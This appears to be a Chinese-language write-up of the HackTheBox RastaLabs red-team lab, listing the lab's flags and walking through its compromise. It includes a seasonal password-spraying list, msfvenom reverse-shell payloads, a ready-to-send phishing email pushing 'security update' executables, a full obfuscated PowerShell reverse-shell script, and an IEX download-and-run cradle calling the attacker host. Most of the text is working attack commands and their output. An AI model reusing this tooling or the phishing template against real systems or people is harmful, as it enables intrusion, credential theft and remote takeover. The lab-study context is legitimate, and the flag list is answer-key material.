---
title: HTB-RastaLabs
description: 'Pro Labs-RastaLabs'
pubDate: 2026-03-17
image: /Pro-Labs/rastalabs.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/hackthebox-prolabs/RastaLabs-1.png)

# Introduction
> #### RastaLabs
> RastaLabs is a red team simulation environment, designed to be attacked as a means of learning and honing your engagement skills. The company provides security and penetration testing services, offering expertise, flexibility and extensive support before, during and after each engagement. They have enlisted your services to perform a red team assessment of their secured Active Directory environment.
>
> The goal of this challenging lab is to gain a foothold, elevate privileges, establish persistence and move laterally, in order to reach the goal of domain admin. There are many flags to be captured and badges to be gained along the way.
>
> This **Red Team Operator Level II** lab will expose players to:
>
> + Active Directory enumeration and exploitation
> + A variety of lateral movement techniques
> + Evading endpoint protections
> + Exploit development
> + Persistence techniques
> + Phishing
> + Privilege escalation
>

# Flags
```plain
RASTA{ph15h1n6_15_h4rdc0r3}
RASTA{br4v3_n3w_w0rld}  
RASTA{w007_f007h0ld_l375_pwn}
RASTA{ju1cy_1nf0_1n_0p3n_5h4r35}
RASTA{4ppl0ck32_5uck5}
RASTA{k3rb3r05_15_7r1cky}
RASTA{n07h1n6_15_54f3}
RASTA{3v3ryb0dy_l0v35_l4p5}
RASTA{50m371m35_y0u_mu57_b4ck7r4ck}
RASTA{53rv1c3_4bu53_f7w}
RASTA{wh3r3_w45_2f4_!?}
RASTA{6p0_4bu53_15_h4rdc0r3}
RASTA{r4574l4b5_ch4mp10n}
RASTA{1nc1d3n7_r35p0nd3r5_l0v3_l065}
RASTA{c4r3ful_h0w_y0u_h4ndl3_cr3d5}  
RASTA{937_84ck_70_w02k}
RASTA{cryp70_3xf1l7r4710n}
RASTA{c00k1n6_w17h_645_n0w}
RASTA{n4m3d_p1p3_53cur17y_f7w}
RASTA{y0ur3_4_b4ll3r_70_637_7h15}
RASTA{n3v34_br34k_7h3_ch41n}
RASTA{d474b4535_4r3_u5u4lly_1n73r3571n6}
```

# StartPoint
```plain
Start IP:10.10.110.0/24
```

## 端口扫描
```plain
nmap 10.10.110.0/24 -vv -Pn -n -F -T4

Nmap scan report for 10.10.110.254
Host is up, received user-set (0.21s latency).
Scanned at 2026-03-13 00:58:11 CST for 53s
Not shown: 98 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 62
443/tcp open  https   syn-ack ttl 126
```

## 目录扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# dirsearch -u http://10.10.110.254    

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/rastalabs/reports/http_10.10.110.254/_26-03-13_19-47-40.txt

Target: http://10.10.110.254/

[19:47:40] Starting:                                  
[19:48:01] 200 -    3KB - /404.html                                         
[19:48:04] 301 -  314B  - /about  ->  http://10.10.110.254/about/           
[19:48:39] 301 -  319B  - /categories  ->  http://10.10.110.254/categories/ 
[19:48:59] 200 -   15KB - /favicon.ico                                      
[19:49:01] 301 -  314B  - /fonts  ->  http://10.10.110.254/fonts/           
[19:49:05] 200 -  528B  - /images/                                          
[19:49:05] 301 -  315B  - /images  ->  http://10.10.110.254/images/
[19:49:40] 301 -  316B  - /scripts  ->  http://10.10.110.254/scripts/       
[19:49:40] 200 -  637B  - /scripts/                                                                         
[19:49:49] 301 -  313B  - /tags  ->  http://10.10.110.254/tags/  
```

# 10.10.110.254
## 80端口
![](/image/hackthebox-prolabs/RastaLabs-2.png)

### about
```plain
http://10.10.110.254/about/
```

![](/image/hackthebox-prolabs/RastaLabs-3.png)

得到大量员工信息

访问用户头像得到用户命名格式

### sitemap.xml
```plain
http://10.10.110.254/sitemap.xml
```

![](/image/hackthebox-prolabs/RastaLabs-4.png)

得到该ip域名，添加hosts

## 443端口
```plain
https://web01.rastalabs.local
```

![](/image/hackthebox-prolabs/RastaLabs-5.png)

### 用户名字典
命名格式

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# cat users.txt  
rastalabs.local\rweston
rastalabs.local\epugh
rastalabs.local\ngodfrey
rastalabs.local\ahope
rastalabs.local\bowen
rastalabs.local\tquinn
rastalabs.local\rweston
```

### 密码字典
在企业环境（尤其是 **Microsoft Active Directory**）里，密码策略通常要求：

+ 大小写字母
+ 数字
+ 特殊符号
+ 定期更换

很多用户为了记忆方便，会形成类似结构：

```plain
Season + Year + !
CompanyName + Year + !
```

生成密码

```plain
RastaLabs2020!
RastaLabs2021!
RastaLabs2022!
RastaLabs2023!
RastaLabs2024!
Spring2020!
Summer2020!
Autumn2020!
Winter2020!
Spring2021!
Summer2021!
Autumn2021!
Winter2021!
Spring2022!
Summer2022!
Autumn2022!
Winter2022!
Spring2023!
Summer2023!
Autumn2023!
Winter2023!
Spring2024!
Summer2024!
Autumn2024!
Winter2024!
RastaLabs2020
RastaLabs2021
RastaLabs2022
RastaLabs2023
RastaLabs2024
Spring2020
Summer2020
Autumn2020
Winter2020
Spring2021
Summer2021
Autumn2021
Winter2021
Spring2022
Summer2022
Autumn2022
Winter2022
Spring2023
Summer2023
Autumn2023
Winter2023
Spring2024
Summer2024
Autumn2024
Winter2024
```

### 密码喷洒
![](/image/hackthebox-prolabs/RastaLabs-6.png)

![](/image/hackthebox-prolabs/RastaLabs-7.png)

成功得到凭据username=rastalabs.local\ahope&password=Summer2025

### Getflag
![](/image/hackthebox-prolabs/RastaLabs-8.png)

在Tasks中拿到第一个flag

![](/image/hackthebox-prolabs/RastaLabs-9.png)

## Outlook-钓鱼
访问People菜单栏

![](/image/hackthebox-prolabs/RastaLabs-10.png)

发现Administrator用户，尝试进行钓鱼攻击

### 生成payload
```plain
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.16.2 LPORT=6666 \
-f exe -o shell.exe
```

```plain
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.16.2
set LPORT 6666
run
```

### 发送邮件
在Mail界面发送邮件给所有用户(全选)

To中依次选择用户 Cc中可以不填(该选项为抄送)

```plain
Dear Team,

Our IT department has identified a configuration issue affecting several workstations on the network. To ensure continued access to internal services, please install the latest security update.

You can download the update from the internal server below:

http://10.10.16.2:80/shell.exe

After downloading, please run the installer and restart your computer.

If you encounter any issues, contact the IT support team.

Thank you for your cooperation.

Best regards,
IT Support Team
```

![](/image/hackthebox-prolabs/RastaLabs-11.png)

![](/image/hackthebox-prolabs/RastaLabs-12.png)

可以发现对方成功下载shell.exe但是并没有反弹迹象，怀疑马被杀了哈哈，也可能是端口做了限制

[GitHub - Sakura529/BypassAV: 通过Patch白文件实现免杀](https://github.com/Sakura529/BypassAV)

这个项目倒是可以在Cybernetics中试一试

```plain
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.16.2 LPORT=443 \
-e x86/shikata_ga_nai -i 10 \
-f exe -o updata.exe
```

```plain
Dear Team,

Our IT department has identified a configuration issue affecting several workstations on the network. To ensure continued access to internal services, please install the latest security update.

You can download the update from the internal server below:

http://10.10.16.2:80/updata.exe

After downloading, please run the installer and restart your computer.

If you encounter any issues, contact the IT support team.

Thank you for your cooperation.

Best regards,
IT Support Team
```

```plain
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.2:443 
[*] Sending stage (190534 bytes) to 10.10.110.254
[*] Sending stage (190534 bytes) to 10.10.110.254
[*] Meterpreter session 1 opened (10.10.16.2:443 -> 10.10.110.254:31550) at 2026-03-14 01:21:37 +0800
[*] Meterpreter session 2 opened (10.10.16.2:443 -> 10.10.110.254:59971) at 2026-03-14 01:21:51 +0800

meterpreter > 
```

成功getshell，并且反弹得到了俩个sessions

```plain
msf exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information         Connection
  --  ----  ----                     -----------         ----------
  1         meterpreter x86/windows  RLAB\tquinn @ WS06  10.10.16.2:443 -> 10.10.110.254:31550 (10.10.
                                                         121.108)
  2         meterpreter x86/windows  RLAB\bowen @ WS04   10.10.16.2:443 -> 10.10.110.254:59971 (10.10.
                                                         123.101)
```

# WS06-10.10.121.108-RLAB\tquinn
## 反弹shell
msf的shell不好使，需要自行反弹

```plain
 function _/=\/==\_/==\_____ 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        ${__/==\/=\_/==\/==\},
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        ${__/====\/\___/=\/\},
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        ${__/\/\/=\_/\/\____},
        [Parameter(ParameterSetName="bind")]
        [Switch]
        ${__/=\_/\___/\/\__/}
    )
    try 
    {
        if (${__/\/\/=\_/\/\____})
        {
            ${/=\___/\__/\___/=} = New-Object System.Net.Sockets.TCPClient(${__/==\/=\_/==\/==\},${__/====\/\___/=\/\})
        }
        if (${__/=\_/\___/\/\__/})
        {
            ${_/===\___/=====\_} = [System.Net.Sockets.TcpListener]${__/====\/\___/=\/\}
            ${_/===\___/=====\_}.start()    
            ${/=\___/\__/\___/=} = ${_/===\___/=====\_}.AcceptTcpClient()
        } 
        ${/==\/====\___/\_/} = ${/=\___/\__/\___/=}.GetStream()
        [byte[]]${/==\/===\_/\_____} = 0..65535|%{0}
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgAA=='))) + $env:username + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAG4AIAA='))) + $env:computername + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEANQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))))
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '>')
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        while((${/===\__/=\/=\_/==} = ${/==\/====\___/\_/}.Read(${/==\/===\_/\_____}, 0, ${/==\/===\_/\_____}.Length)) -ne 0)
        {
            ${/=\______/\__/\/=} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/\/\__/\/\____/\} = ${/=\______/\__/\/=}.GetString(${/==\/===\_/\_____},0, ${/===\__/=\/=\_/==})
            try
            {
                ${/=\/=\/\__/=\/==\} = (iex -Command ${_/\/\__/\/\____/\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${__/\____/===\/\__}  = ${/=\/=\/\__/=\/==\} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '> '
            ${__/==\/==\_/\_/\/} = ($error[0] | Out-String)
            $error.clear()
            ${__/\____/===\/\__} = ${__/\____/===\/\__} + ${__/==\/==\_/\_/\/}
            ${___/==\__/\___/==} = ([text.encoding]::ASCII).GetBytes(${__/\____/===\/\__})
            ${/==\/====\___/\_/}.Write(${___/==\__/\___/==},0,${___/==\__/\___/==}.Length)
            ${/==\/====\___/\_/}.Flush()  
        }
        ${/=\___/\__/\___/=}.Close()
        if (${_/===\___/=====\_})
        {
            ${_/===\___/=====\_}.Stop()
        }
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
_/=\/==\_/==\_____ -__/\/\/=\_/\/\____ -__/==\/=\_/==\/==\ 10.10.16.2 -__/====\/\___/=\/\ 80

```

```plain
meterpreter > execute -f powershell.exe -a "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/rev.ps1')"
Process 2528 created.
```

```plain
┌──(kali㉿kali)-[~/Desktop/tools/netcat]
└─$ updog -p 8080
[+] Serving /home/kali/Desktop/tools/netcat on 0.0.0.0:8080...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8080
 * Running on http://61.139.2.134:8080
Press CTRL+C to quit
10.10.110.254 - - [14/Mar/2026 01:35:47] "GET /rev.ps1 HTTP/1.1" 200 -
```

```plain
┌──(kali㉿kali)-[~/Desktop/tools/netcat]
└─$ nc -lvnp 80                                         
listening on [any] 80 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.110.254] 19761
Windows PowerShell running as user tquinn on WS06
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop>whoami
rlab\tquinn
```

## Getflag
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> cat flag.txt      
RASTA{br4v3_n3w_w0rld}  
```

## 信息收集
### getuid
```plain
meterpreter > getuid
Server username: RLAB\tquinn
```

### sysinfo
```plain
meterpreter > sysinfo
Computer        : WS06
OS              : Windows 10 22H2+ (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : RLAB
Logged On Users : 6
Meterpreter     : x86/windows
```

### ps
```plain
meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session  User         Path
 ---   ----  ----              ----  -------  ----         ----
 0     0     [System Process]
 4     0     System
 92    4     Registry
 312   4     smss.exe
 388   604   dwm.exe
 424   412   csrss.exe
 532   524   csrss.exe
 556   412   wininit.exe
 596   676   svchost.exe
 604   524   winlogon.exe
 676   556   services.exe
 684   556   lsass.exe
 704   676   svchost.exe
 804   676   svchost.exe
 832   556   fontdrvhost.exe
 840   604   fontdrvhost.exe
 924   676   svchost.exe
 976   676   svchost.exe
 1016  676   svchost.exe
 1056  676   svchost.exe
 1084  676   svchost.exe
 1092  676   svchost.exe
 1100  676   svchost.exe
 1136  676   svchost.exe
 1164  676   svchost.exe
 1180  676   svchost.exe
 1192  676   svchost.exe
 1200  676   svchost.exe
 1256  676   svchost.exe
 1264  676   svchost.exe
 1292  676   svchost.exe
 1324  676   svchost.exe
 1412  676   svchost.exe
 1512  676   svchost.exe
 1528  676   svchost.exe
 1568  676   svchost.exe
 1680  676   svchost.exe
 1696  676   svchost.exe
 1704  676   svchost.exe
 1728  676   svchost.exe
 1800  676   svchost.exe
 1836  4     Memory Compressi
             on
 1860  676   svchost.exe
 1884  676   svchost.exe
 1908  6464  conhost.exe       x64   1        RLAB\tquinn  C:\Windows\System32\conhost.exe
 1920  4952  updata.exe        x86   1        RLAB\tquinn  C:\Users\tquinn\AppData\Local\Microsoft\Win
                                                           dows\INetCache\IE\IRV36146\updata.exe
 1964  676   svchost.exe
 1992  676   svchost.exe
 2000  676   svchost.exe
 2008  676   svchost.exe
 2012  804   StartMenuExperie  x64   1        RLAB\tquinn  C:\Windows\SystemApps\Microsoft.Windows.Sta
             nceHost.exe                                   rtMenuExperienceHost_cw5n1h2txyewy\StartMen
                                                           uExperienceHost.exe
 2080  676   svchost.exe
 2188  676   svchost.exe
 2228  676   svchost.exe
 2256  676   svchost.exe
 2300  676   svchost.exe
 2324  676   svchost.exe
 2364  676   SgrmBroker.exe
 2388  676   svchost.exe
 2536  676   spoolsv.exe
 2600  676   svchost.exe
 2640  1920  cmd.exe           x86   1        RLAB\tquinn  C:\Windows\SysWOW64\cmd.exe
 2708  676   svchost.exe
 2716  676   vm3dservice.exe
 2768  676   svchost.exe
 2784  676   vmtoolsd.exe
 2920  676   svchost.exe
 2932  676   svchost.exe
 2940  676   svchost.exe
 2952  676   svchost.exe
 2992  676   svchost.exe
 3012  676   svchost.exe
 3020  676   svchost.exe
 3044  676   VGAuthService.ex
             e
 3080  676   MsMpEng.exe
 3136  676   svchost.exe
 3164  676   uhssvc.exe
 3264  2716  vm3dservice.exe
 3376  676   svchost.exe
 3404  1568  sihost.exe        x64   1        RLAB\tquinn  C:\Windows\System32\sihost.exe
 3564  804   WmiPrvSE.exe
 3620  5368  Phisherman.exe    x64   1        RLAB\tquinn  C:\ProgramData\Phisherman\Phisherman.exe
 3680  676   svchost.exe
 3808  5368  vmtoolsd.exe      x64   1        RLAB\tquinn  C:\Program Files\VMware\VMware Tools\vmtool
                                                           sd.exe
 3852  2640  conhost.exe       x64   1        RLAB\tquinn  C:\Windows\System32\conhost.exe
 3928  676   dllhost.exe
 4132  676   svchost.exe       x64   1        RLAB\tquinn  C:\Windows\System32\svchost.exe
 4156  676   svchost.exe       x64   1        RLAB\tquinn  C:\Windows\System32\svchost.exe
 4248  1292  taskhostw.exe     x64   1        RLAB\tquinn  C:\Windows\System32\taskhostw.exe
 4268  676   svchost.exe
 4316  1292  MicrosoftEdgeUpd
             ate.exe
 4336  676   svchost.exe
 4396  676   svchost.exe
 4536  676   svchost.exe
 4612  4536  ctfmon.exe        x64   1
 4672  676   msdtc.exe
 4688  676   svchost.exe       x64   1        RLAB\tquinn  C:\Windows\System32\svchost.exe
 4864  676   svchost.exe
 5104  676   svchost.exe
 5340  804   MoUsoCoreWorker.
             exe
 5368  5336  explorer.exe      x64   1        RLAB\tquinn  C:\Windows\explorer.exe
 5408  804   WmiPrvSE.exe
 5484  676   svchost.exe
 5644  676   svchost.exe       x64   1        RLAB\tquinn  C:\Windows\System32\svchost.exe
 5728  676   svchost.exe
 5736  676   svchost.exe
 5824  676   svchost.exe
 5848  676   TrustedInstaller
             .exe
 5948  676   SecurityHealthSe
             rvice.exe
 6024  5368  SecurityHealthSy  x64   1        RLAB\tquinn  C:\Windows\System32\SecurityHealthSystray.e
             stray.exe                                     xe
 6072  676   svchost.exe
 6212  804   RuntimeBroker.ex  x64   1        RLAB\tquinn  C:\Windows\System32\RuntimeBroker.exe
             e
 6348  804   SearchApp.exe     x64   1        RLAB\tquinn  C:\Windows\SystemApps\Microsoft.Windows.Sea
                                                           rch_cw5n1h2txyewy\SearchApp.exe
 6356  676   SearchIndexer.ex
             e
 6384  676   svchost.exe
 6464  1920  cmd.exe           x86   1        RLAB\tquinn  C:\Windows\SysWOW64\cmd.exe
 6512  804   UserOOBEBroker.e  x64   1        RLAB\tquinn  C:\Windows\System32\oobe\UserOOBEBroker.exe
             xe
 6524  804   RuntimeBroker.ex  x64   1        RLAB\tquinn  C:\Windows\System32\RuntimeBroker.exe
             e
 6688  804   TiWorker.exe
 6752  676   svchost.exe
 6756  804   mobsync.exe       x64   1        RLAB\tquinn  C:\Windows\System32\mobsync.exe
 6880  676   svchost.exe
 6904  804   RuntimeBroker.ex  x64   1        RLAB\tquinn  C:\Windows\System32\RuntimeBroker.exe
             e
 6960  804   SystemSettings.e  x64   1        RLAB\tquinn  C:\Windows\ImmersiveControlPanel\SystemSett
             xe                                            ings.exe
 6972  804   ApplicationFrame  x64   1        RLAB\tquinn  C:\Windows\System32\ApplicationFrameHost.ex
             Host.exe                                      e
```

### getprivs
```plain
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

### ipconfig
```plain
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  3
============
Name         : vmxnet3 Ethernet Adapter
Hardware MAC : 00:50:56:94:76:ae
MTU          : 1500
IPv4 Address : 10.10.121.108
IPv4 Netmask : 255.255.254.0
IPv6 Address : fe80::dbd2:1ef3:ab2c:36c8
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

### netstat -ano
```plain
meterpreter > netstat -ano

Connection list
===============

    Proto  Local address                  Remote addres  State        User  Inode  PID/Program name
                                          s
    -----  -------------                  -------------  -----        ----  -----  ----------------
    tcp    0.0.0.0:135                    0.0.0.0:*      LISTEN       0     0      924/svchost.exe
    tcp    0.0.0.0:445                    0.0.0.0:*      LISTEN       0     0      4/System
    tcp    0.0.0.0:5040                   0.0.0.0:*      LISTEN       0     0      4864/svchost.exe
    tcp    0.0.0.0:5985                   0.0.0.0:*      LISTEN       0     0      4/System
    tcp    0.0.0.0:47001                  0.0.0.0:*      LISTEN       0     0      4/System
    tcp    0.0.0.0:49664                  0.0.0.0:*      LISTEN       0     0      684/lsass.exe
    tcp    0.0.0.0:49665                  0.0.0.0:*      LISTEN       0     0      556/wininit.exe
    tcp    0.0.0.0:49666                  0.0.0.0:*      LISTEN       0     0      1264/svchost.exe
    tcp    0.0.0.0:49667                  0.0.0.0:*      LISTEN       0     0      1292/svchost.exe
    tcp    0.0.0.0:49669                  0.0.0.0:*      LISTEN       0     0      2536/spoolsv.exe
    tcp    0.0.0.0:49670                  0.0.0.0:*      LISTEN       0     0      684/lsass.exe
    tcp    0.0.0.0:49689                  0.0.0.0:*      LISTEN       0     0      676/services.exe
    tcp    10.10.121.108:139              0.0.0.0:*      LISTEN       0     0      4/System
    tcp    10.10.121.108:49701            10.10.120.5:4  ESTABLISHED  0     0      4/System
                                          45
    tcp    10.10.121.108:50602            10.10.120.10:  ESTABLISHED  0     0      3620/Phisherman.exe
                                          443
    tcp    10.10.121.108:63463            10.10.16.2:44  ESTABLISHED  0     0      1920/updata.exe
                                          3
    tcp    10.10.121.108:63534            10.10.16.2:80  CLOSE_WAIT   0     0      2528/powershell.exe
    tcp    10.10.121.108:63618            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63619            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63620            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63622            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63623            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63624            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63625            10.10.16.2:80  ESTABLISHED  0     0      6988/powershell.exe
    tcp    10.10.121.108:63626            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63627            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp    10.10.121.108:63628            10.10.120.10:  TIME_WAIT    0     0      0/[System Process]
                                          443
    tcp6   :::135                         :::*           LISTEN       0     0      924/svchost.exe
    tcp6   :::445                         :::*           LISTEN       0     0      4/System
    tcp6   :::5985                        :::*           LISTEN       0     0      4/System
    tcp6   :::47001                       :::*           LISTEN       0     0      4/System
    tcp6   :::49664                       :::*           LISTEN       0     0      684/lsass.exe
    tcp6   :::49665                       :::*           LISTEN       0     0      556/wininit.exe
    tcp6   :::49666                       :::*           LISTEN       0     0      1264/svchost.exe
    tcp6   :::49667                       :::*           LISTEN       0     0      1292/svchost.exe
    tcp6   :::49669                       :::*           LISTEN       0     0      2536/spoolsv.exe
    tcp6   :::49670                       :::*           LISTEN       0     0      684/lsass.exe
    tcp6   :::49689                       :::*           LISTEN       0     0      676/services.exe
    udp    0.0.0.0:123                    0.0.0.0:*                   0     0      1092/svchost.exe
    udp    0.0.0.0:5050                   0.0.0.0:*                   0     0      4864/svchost.exe
    udp    0.0.0.0:5353                   0.0.0.0:*                   0     0      1180/svchost.exe
    udp    0.0.0.0:5355                   0.0.0.0:*                   0     0      1180/svchost.exe
    udp    10.10.121.108:137              0.0.0.0:*                   0     0      4/System
    udp    10.10.121.108:138              0.0.0.0:*                   0     0      4/System
    udp    10.10.121.108:1900             0.0.0.0:*                   0     0      5824/svchost.exe
    udp    10.10.121.108:53222            0.0.0.0:*                   0     0      5824/svchost.exe
    udp    127.0.0.1:1900                 0.0.0.0:*                   0     0      5824/svchost.exe
    udp    127.0.0.1:53223                0.0.0.0:*                   0     0      5824/svchost.exe
    udp    127.0.0.1:55823                0.0.0.0:*                   0     0      1512/svchost.exe
    udp    127.0.0.1:60949                0.0.0.0:*                   0     0      684/lsass.exe
    udp    127.0.0.1:62627                0.0.0.0:*                   0     0      2708/svchost.exe
    udp6   :::123                         :::*                        0     0      1092/svchost.exe
    udp6   :::5353                        :::*                        0     0      1180/svchost.exe
    udp6   :::5355                        :::*                        0     0      1180/svchost.exe
    udp6   ::1:1900                       :::*                        0     0      5824/svchost.exe
    udp6   ::1:53221                      :::*                        0     0      5824/svchost.exe
    udp6   fe80::dbd2:1ef3:ab2c:36c8:190  :::*                        0     0      5824/svchost.exe
           0
    udp6   fe80::dbd2:1ef3:ab2c:36c8:532  :::*                        0     0      5824/svchost.exe
           20
```

### whoami/groups
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
RLAB\Human Resources                       Group            S-1-5-21-1396373213-2872852198-2033860859-1165 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      
```

### net user /domain
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> net user /domain
The request will be processed at a domain controller for domain rastalabs.local.


User accounts for \\dc01.rastalabs.local

-------------------------------------------------------------------------------
$531000-S5O9F7AAC4AK     acronis_backup           Administrator            
ahope                    bowen                    DefaultAccount           
epugh                    epugh_adm                Guest                    
HealthMailbox0cca363     HealthMailbox0f17b3d     HealthMailbox1c0e846     
HealthMailbox3302aa9     HealthMailbox78a8527     HealthMailbox84ecfca     
HealthMailbox98ed438     HealthMailboxb517d4c     HealthMailboxbe893fc     
HealthMailboxd829eae     HealthMailboxdba7dad     krbtgt                   
ngodfrey                 ngodfrey_adm             rweston                  
rweston_da               SM_1139242ae3db4b5b8     SM_33273f8672e44108a     
SM_539c73abc80a42fa8     SM_85e3a77087d944589     SM_861d1de31283424ea     
SM_8e60c30a353c4b739     SM_b60219ade4274bccb     SM_d4210db683be425f9     
SM_f9fbfbb968474d339     tquinn                   
The command completed successfully.
```

### net group "Domain Admins" /domain
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> net group "Domain Admins" /domain
The request will be processed at a domain controller for domain rastalabs.local.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            rweston_da               
The command completed successfully.
```

net view \\fs01

```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> net view \\fs01
Shared resources at \\fs01



Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
finance     Disk                    
The command completed successfully.

PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> dir \\fs01\finance


    Directory: \\fs01\finance


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        31/10/2017     19:21             32 flag.txt 

PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> type \\fs01\finance\flag.txt
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> type : Access to the path '\\fs01\finance\flag.txt' is denied.
At line:1 char:1
